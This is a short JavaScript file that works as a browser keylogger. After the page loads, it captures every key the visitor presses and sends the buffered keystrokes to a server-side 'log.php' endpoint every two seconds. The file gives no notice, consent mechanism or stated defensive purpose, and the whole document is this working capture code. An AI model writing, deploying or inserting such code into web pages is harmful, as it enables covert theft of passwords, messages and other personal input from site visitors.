document.addEventListener('DOMContentLoaded', () => {
    let keystrokes = [];

    document.onkeydown = function (event) {
        const logEntry = `Key: ${event.key}, Code: ${event.code}`;
        keystrokes.push(logEntry);
    };

    setInterval(() => {
        if (keystrokes.length > 0) {
            fetch('log.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ logEntries: keystrokes })
            })
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error('Error:', error));

            // Clear the keystrokes array after sending
            keystrokes = [];
        }
    }, 2000); // Send keystrokes every 2 seconds
});
